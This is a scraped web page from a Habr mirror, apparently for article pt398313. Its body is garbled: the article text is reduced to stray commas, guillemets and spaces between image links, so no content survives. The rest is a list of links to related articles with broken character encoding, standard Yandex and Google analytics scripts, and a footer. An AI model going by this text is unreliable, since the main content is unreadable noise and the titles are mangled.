<img src="https://habrastorage.org/files/7f7/05b/2eb/7f705b2ebb5d4b5bb19bc37eeb6e7c16.png"><br>
<br>
     56      , ¬´ ¬ª,     ,    . <br>
     ,   ,  ¬´ ¬ª,     ,     .<br>
<br>
       :<br>
<br>
<img src="https://habrastorage.org/files/6f8/ef9/849/6f8ef98493bc40c1949431241c59d0a0.png"><br>
<br>
<img src="https://habrastorage.org/files/52f/15a/2ea/52f15a2eaf94401baf1a7995169b2470.png"><br>
<br>
     -  -.          ,     .   ,          .     .  ,     .    ,          ,   ,  . <br>
</div></div><br>
</div></div></div>
      
    </div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/pt398313/">https://habr.com/ru/post/pt398313/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../pt398301/index.html">Casa ou brinquedo inteligente para homens: controle de temperatura</a></li>
<li><a href="../pt398303/index.html">D√©cimo cent√©simo Ideapad - an√°lise do port√°til para jogos Y-series</a></li>
<li><a href="../pt398305/index.html">A tradu√ß√£o do segundo livro da s√©rie "Mem√≥ria do passado da terra", "Floresta escura" - est√° conclu√≠da. Aprecie a leitura</a></li>
<li><a href="../pt398309/index.html">Problemas da rob√≥tica moderna 2, ou como os jogos salvar√£o o mundo ...</a></li>
<li><a href="../pt398311/index.html">Tent√°culos mec√¢nicos manuais em casa: parte 2, gerenciamento de cabos</a></li>
<li><a href="../pt398315/index.html">–ö–∞–∫ —Ñ–æ—Ç–æ–Ω—ã –≤–æ—Å–ø—Ä–∏–Ω–∏–º–∞—é—Ç –≤—Ä–µ–º—è?</a></li>
<li><a href="../pt398317/index.html">House-with-Mind ou automa√ß√£o pronta para uso</a></li>
<li><a href="../pt398319/index.html">Bart Knolls - um intransigente assassino de mosquitos</a></li>
<li><a href="../pt398321/index.html">Matar Membros - Uma Estrat√©gia Evolucion√°ria Desatualizada</a></li>
<li><a href="../pt398323/index.html">Atores de voz de videogame se preparam para fazer greve para desenvolvedores</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>